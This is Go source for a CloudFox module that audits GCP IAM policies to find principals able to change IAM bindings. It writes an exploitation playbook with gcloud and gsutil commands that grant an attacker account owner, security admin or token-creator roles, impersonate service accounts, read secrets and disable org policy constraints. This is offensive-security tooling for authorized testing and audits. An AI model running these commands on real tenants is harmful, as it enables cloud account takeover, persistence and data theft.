package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	iampb "cloud.google.com/go/iam/apiv1/iampb"
	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	resourcemanagerpb "cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"
)

var GCPHiddenAdminsCommand = &cobra.Command{
	Use:     globals.GCP_HIDDEN_ADMINS_MODULE_NAME,
	Aliases: []string{"ha", "hidden"},
	Short:   "Identify principals who can modify IAM policies (hidden admins)",
	Long: `Analyze GCP IAM policies to identify principals who can modify IAM bindings.

This module finds "hidden admins" - principals who may not have obvious admin roles
but possess permissions to grant themselves or others elevated access.

Detected IAM modification capabilities:

Organization Level:
- resourcemanager.organizations.setIamPolicy - Modify org-wide IAM
- iam.roles.create/update at org level - Create/modify org custom roles

Folder Level:
- resourcemanager.folders.setIamPolicy - Modify folder IAM (affects all children)

Project Level:
- resourcemanager.projects.setIamPolicy - Modify project IAM
- iam.roles.create/update - Create/modify project custom roles

Service Account Level:
- iam.serviceAccounts.setIamPolicy - Grant SA access to others
- iam.serviceAccounts.create + setIamPolicy combo

Resource Level IAM:
- storage.buckets.setIamPolicy - Modify bucket IAM
- bigquery.datasets.setIamPolicy - Modify dataset IAM
- pubsub.topics/subscriptions.setIamPolicy - Modify Pub/Sub IAM
- secretmanager.secrets.setIamPolicy - Modify secret IAM
- compute.instances.setIamPolicy - Modify instance IAM
- cloudfunctions.functions.setIamPolicy - Modify function IAM
- run.services.setIamPolicy - Modify Cloud Run IAM
- artifactregistry.repositories.setIamPolicy - Modify registry IAM`,
	Run: runGCPHiddenAdminsCommand,
}

// IAMModificationPermission represents a permission that allows IAM policy modification
type IAMModificationPermission struct {
	Permission  string
	Category    string
	Description string
}

// HiddenAdmin represents a principal with IAM modification capabilities
type HiddenAdmin struct {
	Principal      string
	PrincipalType  string
	Permission     string
	Category       string
	Description    string
	ScopeType      string // organization, folder, project, resource
	ScopeID        string
	ScopeName      string
	ExploitCommand string
}

type HiddenAdminsModule struct {
	gcpinternal.BaseGCPModule

	AllAdmins      []HiddenAdmin
	OrgAdmins      []HiddenAdmin
	FolderAdmins   []HiddenAdmin
	ProjectAdmins  map[string][]HiddenAdmin // projectID -> admins
	ResourceAdmins []HiddenAdmin

	OrgIDs      []string
	OrgNames    map[string]string
	FolderNames map[string]string

	LootMap map[string]*internal.LootFile
	mu      sync.Mutex
}

type HiddenAdminsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o HiddenAdminsOutput) TableFiles() []internal.TableFile { return o.Table }
func (o HiddenAdminsOutput) LootFiles() []internal.LootFile   { return o.Loot }

func runGCPHiddenAdminsCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_HIDDEN_ADMINS_MODULE_NAME)
	if err != nil {
		return
	}

	module := &HiddenAdminsModule{
		BaseGCPModule:  gcpinternal.NewBaseGCPModule(cmdCtx),
		AllAdmins:      []HiddenAdmin{},
		OrgAdmins:      []HiddenAdmin{},
		FolderAdmins:   []HiddenAdmin{},
		ProjectAdmins:  make(map[string][]HiddenAdmin),
		ResourceAdmins: []HiddenAdmin{},
		OrgIDs:         []string{},
		OrgNames:       make(map[string]string),
		FolderNames:    make(map[string]string),
		LootMap:        make(map[string]*internal.LootFile),
	}
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// GetIAMModificationPermissions returns permissions that allow IAM policy modification
func GetIAMModificationPermissions() []IAMModificationPermission {
	return []IAMModificationPermission{
		// Organization-level IAM
		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "Org IAM", Description: "Modify organization-wide IAM policy"},

		// Folder-level IAM
		{Permission: "resourcemanager.folders.setIamPolicy", Category: "Folder IAM", Description: "Modify folder IAM policy (affects all children)"},

		// Project-level IAM
		{Permission: "resourcemanager.projects.setIamPolicy", Category: "Project IAM", Description: "Modify project IAM policy"},

		// Custom Role Management
		{Permission: "iam.roles.create", Category: "Custom Roles", Description: "Create custom IAM roles"},
		{Permission: "iam.roles.update", Category: "Custom Roles", Description: "Modify custom IAM role permissions"},

		// Service Account IAM
		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "SA IAM", Description: "Grant access to service accounts"},

		// Org Policy (can disable security constraints)
		{Permission: "orgpolicy.policy.set", Category: "Org Policy", Description: "Modify organization policies"},

		// Resource-specific IAM
		{Permission: "storage.buckets.setIamPolicy", Category: "Storage IAM", Description: "Modify bucket IAM policy"},
		{Permission: "bigquery.datasets.setIamPolicy", Category: "BigQuery IAM", Description: "Modify dataset IAM policy"},
		{Permission: "pubsub.topics.setIamPolicy", Category: "Pub/Sub IAM", Description: "Modify topic IAM policy"},
		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "Pub/Sub IAM", Description: "Modify subscription IAM policy"},
		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets IAM", Description: "Modify secret IAM policy"},
		{Permission: "compute.instances.setIamPolicy", Category: "Compute IAM", Description: "Modify instance IAM policy"},
		{Permission: "compute.images.setIamPolicy", Category: "Compute IAM", Description: "Modify image IAM policy"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "Compute IAM", Description: "Modify snapshot IAM policy"},
		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Functions IAM", Description: "Modify function IAM policy"},
		{Permission: "run.services.setIamPolicy", Category: "Cloud Run IAM", Description: "Modify Cloud Run service IAM policy"},
		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "Artifact Registry IAM", Description: "Modify repository IAM policy"},
		{Permission: "cloudkms.cryptoKeys.setIamPolicy", Category: "KMS IAM", Description: "Modify KMS key IAM policy"},
	}
}

func (m *HiddenAdminsModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Analyzing IAM policies to identify hidden admins...", globals.GCP_HIDDEN_ADMINS_MODULE_NAME)

	// Build permission map
	permMap := make(map[string]IAMModificationPermission)
	for _, p := range GetIAMModificationPermissions() {
		permMap[p.Permission] = p
	}

	// Analyze organization-level IAM
	m.analyzeOrganizationIAM(ctx, logger, permMap)

	// Analyze folder-level IAM
	m.analyzeFolderIAM(ctx, logger, permMap)

	// Analyze project-level IAM for each project
	for _, projectID := range m.ProjectIDs {
		m.analyzeProjectIAM(ctx, logger, projectID, permMap)
	}

	// Generate loot (playbook)
	m.generateLoot()

	if len(m.AllAdmins) == 0 {
		logger.InfoM("No hidden admins found", globals.GCP_HIDDEN_ADMINS_MODULE_NAME)
		return
	}

	// Count by scope type
	orgCount := len(m.OrgAdmins)
	folderCount := len(m.FolderAdmins)
	projectCount := 0
	for _, admins := range m.ProjectAdmins {
		projectCount += len(admins)
	}
	resourceCount := len(m.ResourceAdmins)

	logger.SuccessM(fmt.Sprintf("Found %d hidden admin(s): %d org-level, %d folder-level, %d project-level, %d resource-level",
		len(m.AllAdmins), orgCount, folderCount, projectCount, resourceCount), globals.GCP_HIDDEN_ADMINS_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

func (m *HiddenAdminsModule) analyzeOrganizationIAM(ctx context.Context, logger internal.Logger, permMap map[string]IAMModificationPermission) {
	orgsClient, err := resourcemanager.NewOrganizationsClient(ctx)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_HIDDEN_ADMINS_MODULE_NAME, "Could not create organizations client")
		}
		return
	}
	defer orgsClient.Close()

	// Get IAM service for role resolution
	iamService, _ := m.getIAMService(ctx)

	searchReq := &resourcemanagerpb.SearchOrganizationsRequest{}
	it := orgsClient.SearchOrganizations(ctx, searchReq)
	for {
		org, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		orgID := strings.TrimPrefix(org.Name, "organizations/")
		m.OrgNames[orgID] = org.DisplayName
		m.OrgIDs = append(m.OrgIDs, orgID)

		policy, err := orgsClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: org.Name,
		})
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := m.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				m.checkForHiddenAdmins(member, permissions, permMap, "organization", orgID, org.DisplayName)
			}
		}
	}
}

func (m *HiddenAdminsModule) analyzeFolderIAM(ctx context.Context, logger internal.Logger, permMap map[string]IAMModificationPermission) {
	foldersClient, err := resourcemanager.NewFoldersClient(ctx)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_HIDDEN_ADMINS_MODULE_NAME, "Could not create folders client")
		}
		return
	}
	defer foldersClient.Close()

	iamService, _ := m.getIAMService(ctx)

	searchReq := &resourcemanagerpb.SearchFoldersRequest{}
	it := foldersClient.SearchFolders(ctx, searchReq)
	for {
		folder, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		folderID := strings.TrimPrefix(folder.Name, "folders/")
		m.FolderNames[folderID] = folder.DisplayName

		policy, err := foldersClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: folder.Name,
		})
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := m.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				m.checkForHiddenAdmins(member, permissions, permMap, "folder", folderID, folder.DisplayName)
			}
		}
	}
}

func (m *HiddenAdminsModule) analyzeProjectIAM(ctx context.Context, logger internal.Logger, projectID string, permMap map[string]IAMModificationPermission) {
	crmService, err := crmv1.NewService(ctx)
	if err != nil {
		return
	}

	policy, err := crmService.Projects.GetIamPolicy(projectID, &crmv1.GetIamPolicyRequest{}).Do()
	if err != nil {
		return
	}

	iamService, _ := m.getIAMService(ctx)
	projectName := m.GetProjectName(projectID)

	for _, binding := range policy.Bindings {
		if binding == nil {
			continue
		}
		permissions := m.getRolePermissions(iamService, binding.Role, projectID)
		for _, member := range binding.Members {
			m.checkForHiddenAdmins(member, permissions, permMap, "project", projectID, projectName)
		}
	}
}

func (m *HiddenAdminsModule) checkForHiddenAdmins(member string, permissions []string, permMap map[string]IAMModificationPermission, scopeType, scopeID, scopeName string) {
	if member == "allUsers" || member == "allAuthenticatedUsers" {
		return
	}

	principalType := extractPrincipalType(member)
	principal := extractPrincipalEmail(member)

	for _, perm := range permissions {
		if iamPerm, ok := permMap[perm]; ok {
			admin := HiddenAdmin{
				Principal:      principal,
				PrincipalType:  principalType,
				Permission:     perm,
				Category:       iamPerm.Category,
				Description:    iamPerm.Description,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				ExploitCommand: m.generateExploitCommand(perm, scopeType, scopeID),
			}

			m.mu.Lock()
			m.AllAdmins = append(m.AllAdmins, admin)
			switch scopeType {
			case "organization":
				m.OrgAdmins = append(m.OrgAdmins, admin)
			case "folder":
				m.FolderAdmins = append(m.FolderAdmins, admin)
			case "project":
				m.ProjectAdmins[scopeID] = append(m.ProjectAdmins[scopeID], admin)
			case "resource":
				m.ResourceAdmins = append(m.ResourceAdmins, admin)
			}
			m.mu.Unlock()
		}
	}
}

func (m *HiddenAdminsModule) generateExploitCommand(permission, scopeType, scopeID string) string {
	switch permission {
	case "resourcemanager.organizations.setIamPolicy":
		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member='user:ATTACKER@example.com' --role='roles/owner'", scopeID)
	case "resourcemanager.folders.setIamPolicy":
		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member='user:ATTACKER@example.com' --role='roles/owner'", scopeID)
	case "resourcemanager.projects.setIamPolicy":
		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member='user:ATTACKER@example.com' --role='roles/owner'", scopeID)
	case "iam.roles.create":
		return fmt.Sprintf("gcloud iam roles create customAdmin --project=%s --permissions=resourcemanager.projects.setIamPolicy", scopeID)
	case "iam.roles.update":
		return fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=resourcemanager.projects.setIamPolicy", scopeID)
	case "iam.serviceAccounts.setIamPolicy":
		return fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding SA@%s.iam.gserviceaccount.com --member='user:ATTACKER@example.com' --role='roles/iam.serviceAccountTokenCreator'", scopeID)
	case "orgpolicy.policy.set":
		return "# Disable org policy constraints to bypass security controls"
	case "storage.buckets.setIamPolicy":
		return "gsutil iam ch user:ATTACKER@example.com:objectViewer gs://BUCKET_NAME"
	case "bigquery.datasets.setIamPolicy":
		return fmt.Sprintf("bq add-iam-policy-binding --member='user:ATTACKER@example.com' --role='roles/bigquery.dataViewer' %s:DATASET", scopeID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

func (m *HiddenAdminsModule) getIAMService(ctx context.Context) (*iam.Service, error) {
	return iam.NewService(ctx)
}

func (m *HiddenAdminsModule) getRolePermissions(iamService *iam.Service, role string, projectID string) []string {
	if iamService == nil {
		return []string{}
	}

	var roleInfo *iam.Role
	var err error

	if strings.HasPrefix(role, "roles/") {
		roleInfo, err = iamService.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "projects/") {
		roleInfo, err = iamService.Projects.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "organizations/") {
		roleInfo, err = iamService.Organizations.Roles.Get(role).Do()
	} else {
		roleInfo, err = iamService.Roles.Get("roles/" + role).Do()
	}

	if err != nil {
		return m.getKnownRolePermissions(role)
	}

	return roleInfo.IncludedPermissions
}

func (m *HiddenAdminsModule) getKnownRolePermissions(role string) []string {
	knownRoles := map[string][]string{
		"roles/owner": {
			"resourcemanager.projects.setIamPolicy",
			"iam.serviceAccounts.setIamPolicy",
			"iam.roles.create",
			"iam.roles.update",
			"storage.buckets.setIamPolicy",
			"bigquery.datasets.setIamPolicy",
		},
		"roles/resourcemanager.organizationAdmin": {
			"resourcemanager.organizations.setIamPolicy",
		},
		"roles/resourcemanager.folderAdmin": {
			"resourcemanager.folders.setIamPolicy",
		},
		"roles/resourcemanager.projectIamAdmin": {
			"resourcemanager.projects.setIamPolicy",
		},
		"roles/iam.securityAdmin": {
			"resourcemanager.projects.setIamPolicy",
			"iam.serviceAccounts.setIamPolicy",
		},
		"roles/iam.serviceAccountAdmin": {
			"iam.serviceAccounts.setIamPolicy",
		},
		"roles/iam.roleAdmin": {
			"iam.roles.create",
			"iam.roles.update",
		},
	}

	if perms, ok := knownRoles[role]; ok {
		return perms
	}
	return []string{}
}

func (m *HiddenAdminsModule) generateLoot() {
	m.LootMap["hidden-admins-exploit-commands"] = &internal.LootFile{
		Name:     "hidden-admins-exploit-commands",
		Contents: "# GCP Hidden Admins - IAM Modification Exploit Commands\n# Generated by CloudFox\n\n",
	}

	// Add entity-specific exploit commands
	for _, admin := range m.AllAdmins {
		m.addAdminToLoot(admin)
	}

	// Add playbook
	m.generatePlaybook()
}

func (m *HiddenAdminsModule) addAdminToLoot(admin HiddenAdmin) {
	lootFile := m.LootMap["hidden-admins-exploit-commands"]
	if lootFile == nil {
		return
	}

	scopeInfo := fmt.Sprintf("%s: %s", admin.ScopeType, admin.ScopeName)
	if admin.ScopeName == "" {
		scopeInfo = fmt.Sprintf("%s: %s", admin.ScopeType, admin.ScopeID)
	}

	lootFile.Contents += fmt.Sprintf(
		"# Permission: %s\n"+
			"# Principal: %s (%s)\n"+
			"# Scope: %s\n"+
			"# Category: %s\n"+
			"%s\n\n",
		admin.Permission,
		admin.Principal, admin.PrincipalType,
		scopeInfo,
		admin.Category,
		admin.ExploitCommand,
	)
}

func (m *HiddenAdminsModule) generatePlaybook() {
	m.LootMap["hidden-admins-playbook"] = &internal.LootFile{
		Name: "hidden-admins-playbook",
		Contents: `# GCP Hidden Admins Exploitation Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for principals with IAM modification capabilities.

` + m.generatePlaybookSections(),
	}
}

func (m *HiddenAdminsModule) generatePlaybookSections() string {
	var sections strings.Builder

	// Group admins by permission category
	categories := map[string][]HiddenAdmin{
		"Org IAM":              {},
		"Folder IAM":           {},
		"Project IAM":          {},
		"Custom Roles":         {},
		"SA IAM":               {},
		"Org Policy":           {},
		"Storage IAM":          {},
		"BigQuery IAM":         {},
		"Pub/Sub IAM":          {},
		"Secrets IAM":          {},
		"Compute IAM":          {},
		"Functions IAM":        {},
		"Cloud Run IAM":        {},
		"Artifact Registry IAM": {},
		"KMS IAM":              {},
	}

	for _, admin := range m.AllAdmins {
		if _, ok := categories[admin.Category]; ok {
			categories[admin.Category] = append(categories[admin.Category], admin)
		}
	}

	// Organization IAM Modification
	if len(categories["Org IAM"]) > 0 {
		sections.WriteString("## Organization IAM Modification\n\n")
		sections.WriteString("Principals with organization-level IAM modification can grant any role to any principal across the entire organization.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Org IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) at %s\n", admin.Principal, admin.PrincipalType, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant yourself Owner role at org level\n")
		sections.WriteString("gcloud organizations add-iam-policy-binding ORG_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/owner'\n\n")
		sections.WriteString("# Or grant more subtle roles for persistence\n")
		sections.WriteString("gcloud organizations add-iam-policy-binding ORG_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/iam.securityAdmin'\n")
		sections.WriteString("```\n\n")
	}

	// Folder IAM Modification
	if len(categories["Folder IAM"]) > 0 {
		sections.WriteString("## Folder IAM Modification\n\n")
		sections.WriteString("Principals with folder-level IAM modification can grant roles affecting all projects in the folder hierarchy.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Folder IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) at folder %s\n", admin.Principal, admin.PrincipalType, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant yourself Editor role at folder level (affects all child projects)\n")
		sections.WriteString("gcloud resource-manager folders add-iam-policy-binding FOLDER_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/editor'\n")
		sections.WriteString("```\n\n")
	}

	// Project IAM Modification
	if len(categories["Project IAM"]) > 0 {
		sections.WriteString("## Project IAM Modification\n\n")
		sections.WriteString("Principals with project-level IAM modification can grant any role within the project.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Project IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) in project %s\n", admin.Principal, admin.PrincipalType, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant yourself Owner role\n")
		sections.WriteString("gcloud projects add-iam-policy-binding PROJECT_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/owner'\n\n")
		sections.WriteString("# Grant compute admin for instance access\n")
		sections.WriteString("gcloud projects add-iam-policy-binding PROJECT_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/compute.admin'\n")
		sections.WriteString("```\n\n")
	}

	// Custom Role Management
	if len(categories["Custom Roles"]) > 0 {
		sections.WriteString("## Custom Role Management\n\n")
		sections.WriteString("Principals who can create or update custom roles can add dangerous permissions to existing roles or create new privileged roles.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Custom Roles"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s in %s\n", admin.Principal, admin.PrincipalType, admin.Permission, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create a custom role with setIamPolicy permission\n")
		sections.WriteString("gcloud iam roles create customPrivesc --project=PROJECT_ID \\\n")
		sections.WriteString("    --title='Custom Admin' \\\n")
		sections.WriteString("    --permissions='resourcemanager.projects.setIamPolicy'\n\n")
		sections.WriteString("# Update existing custom role to add dangerous permissions\n")
		sections.WriteString("gcloud iam roles update ROLE_ID --project=PROJECT_ID \\\n")
		sections.WriteString("    --add-permissions='iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create'\n")
		sections.WriteString("```\n\n")
	}

	// Service Account IAM
	if len(categories["SA IAM"]) > 0 {
		sections.WriteString("## Service Account IAM Modification\n\n")
		sections.WriteString("Principals who can modify service account IAM can grant themselves or others the ability to impersonate SAs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["SA IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) in %s\n", admin.Principal, admin.PrincipalType, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List service accounts to find targets\n")
		sections.WriteString("gcloud iam service-accounts list --project=PROJECT_ID\n\n")
		sections.WriteString("# Grant yourself token creator role on a privileged SA\n")
		sections.WriteString("gcloud iam service-accounts add-iam-policy-binding \\\n")
		sections.WriteString("    SA@PROJECT_ID.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/iam.serviceAccountTokenCreator'\n\n")
		sections.WriteString("# Then impersonate the SA\n")
		sections.WriteString("gcloud auth print-access-token \\\n")
		sections.WriteString("    --impersonate-service-account=SA@PROJECT_ID.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Org Policy
	if len(categories["Org Policy"]) > 0 {
		sections.WriteString("## Organization Policy Modification\n\n")
		sections.WriteString("Principals who can modify org policies can disable security constraints.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Org Policy"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) at %s\n", admin.Principal, admin.PrincipalType, admin.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Disable domain restricted sharing constraint\n")
		sections.WriteString("gcloud resource-manager org-policies disable-enforce \\\n")
		sections.WriteString("    constraints/iam.allowedPolicyMemberDomains \\\n")
		sections.WriteString("    --organization=ORG_ID\n\n")
		sections.WriteString("# Disable public access prevention\n")
		sections.WriteString("gcloud resource-manager org-policies disable-enforce \\\n")
		sections.WriteString("    constraints/storage.publicAccessPrevention \\\n")
		sections.WriteString("    --project=PROJECT_ID\n")
		sections.WriteString("```\n\n")
	}

	// Storage IAM
	if len(categories["Storage IAM"]) > 0 {
		sections.WriteString("## Storage Bucket IAM Modification\n\n")
		sections.WriteString("Principals who can modify bucket IAM can grant themselves access to bucket contents.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Storage IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s)\n", admin.Principal, admin.PrincipalType))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant yourself object viewer on a bucket\n")
		sections.WriteString("gsutil iam ch user:attacker@example.com:objectViewer gs://BUCKET_NAME\n\n")
		sections.WriteString("# Or grant full admin access\n")
		sections.WriteString("gsutil iam ch user:attacker@example.com:objectAdmin gs://BUCKET_NAME\n")
		sections.WriteString("```\n\n")
	}

	// Secrets IAM
	if len(categories["Secrets IAM"]) > 0 {
		sections.WriteString("## Secret Manager IAM Modification\n\n")
		sections.WriteString("Principals who can modify secret IAM can grant themselves access to secret values.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, admin := range categories["Secrets IAM"] {
			sections.WriteString(fmt.Sprintf("- %s (%s)\n", admin.Principal, admin.PrincipalType))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant yourself secret accessor role\n")
		sections.WriteString("gcloud secrets add-iam-policy-binding SECRET_NAME \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/secretmanager.secretAccessor' \\\n")
		sections.WriteString("    --project=PROJECT_ID\n\n")
		sections.WriteString("# Then access the secret\n")
		sections.WriteString("gcloud secrets versions access latest --secret=SECRET_NAME --project=PROJECT_ID\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}

func (m *HiddenAdminsModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *HiddenAdminsModule) getHeader() []string {
	return []string{
		"Scope Type",
		"Scope ID",
		"Scope Name",
		"Principal",
		"Principal Type",
		"Permission",
		"Category",
	}
}

func (m *HiddenAdminsModule) adminsToTableBody(admins []HiddenAdmin) [][]string {
	var body [][]string
	for _, admin := range admins {
		scopeName := admin.ScopeName
		if scopeName == "" {
			scopeName = admin.ScopeID
		}

		body = append(body, []string{
			admin.ScopeType,
			admin.ScopeID,
			scopeName,
			admin.Principal,
			admin.PrincipalType,
			admin.Permission,
			admin.Category,
		})
	}
	return body
}

func (m *HiddenAdminsModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile
	if admins, ok := m.ProjectAdmins[projectID]; ok && len(admins) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "hidden-admins",
			Header: m.getHeader(),
			Body:   m.adminsToTableBody(admins),
		})
	}
	return tableFiles
}

func (m *HiddenAdminsModule) buildAllTables() []internal.TableFile {
	if len(m.AllAdmins) == 0 {
		return nil
	}
	return []internal.TableFile{
		{
			Name:   "hidden-admins",
			Header: m.getHeader(),
			Body:   m.adminsToTableBody(m.AllAdmins),
		},
	}
}

func (m *HiddenAdminsModule) collectLootFiles() []internal.LootFile {
	var lootFiles []internal.LootFile
	for _, loot := range m.LootMap {
		if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
			lootFiles = append(lootFiles, *loot)
		}
	}
	return lootFiles
}

func (m *HiddenAdminsModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	orgID := ""
	if m.Hierarchy != nil && len(m.Hierarchy.Organizations) > 0 {
		orgID = m.Hierarchy.Organizations[0].ID
	} else if len(m.OrgIDs) > 0 {
		orgID = m.OrgIDs[0]
	}

	if orgID != "" {
		tables := m.buildAllTables()
		lootFiles := m.collectLootFiles()
		outputData.OrgLevelData[orgID] = HiddenAdminsOutput{Table: tables, Loot: lootFiles}

		for _, projectID := range m.ProjectIDs {
			projectTables := m.buildTablesForProject(projectID)
			if len(projectTables) > 0 && len(projectTables[0].Body) > 0 {
				outputData.ProjectLevelData[projectID] = HiddenAdminsOutput{Table: projectTables, Loot: nil}
			}
		}
	} else if len(m.ProjectIDs) > 0 {
		tables := m.buildAllTables()
		lootFiles := m.collectLootFiles()
		outputData.ProjectLevelData[m.ProjectIDs[0]] = HiddenAdminsOutput{Table: tables, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_HIDDEN_ADMINS_MODULE_NAME)
	}
}

func (m *HiddenAdminsModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	tables := m.buildAllTables()
	lootFiles := m.collectLootFiles()

	output := HiddenAdminsOutput{Table: tables, Loot: lootFiles}

	var scopeType string
	var scopeIdentifiers []string
	var scopeNames []string

	if len(m.OrgIDs) > 0 {
		scopeType = "organization"
		for _, orgID := range m.OrgIDs {
			scopeIdentifiers = append(scopeIdentifiers, orgID)
			if name, ok := m.OrgNames[orgID]; ok && name != "" {
				scopeNames = append(scopeNames, name)
			} else {
				scopeNames = append(scopeNames, orgID)
			}
		}
	} else {
		scopeType = "project"
		scopeIdentifiers = m.ProjectIDs
		for _, id := range m.ProjectIDs {
			scopeNames = append(scopeNames, m.GetProjectName(id))
		}
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIdentifiers,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_HIDDEN_ADMINS_MODULE_NAME)
	}
}

// Helper functions (shared with attackpathService)
func extractPrincipalType(member string) string {
	if strings.HasPrefix(member, "user:") {
		return "user"
	} else if strings.HasPrefix(member, "serviceAccount:") {
		return "serviceAccount"
	} else if strings.HasPrefix(member, "group:") {
		return "group"
	} else if strings.HasPrefix(member, "domain:") {
		return "domain"
	}
	return "unknown"
}

func extractPrincipalEmail(member string) string {
	parts := strings.SplitN(member, ":", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return member
}
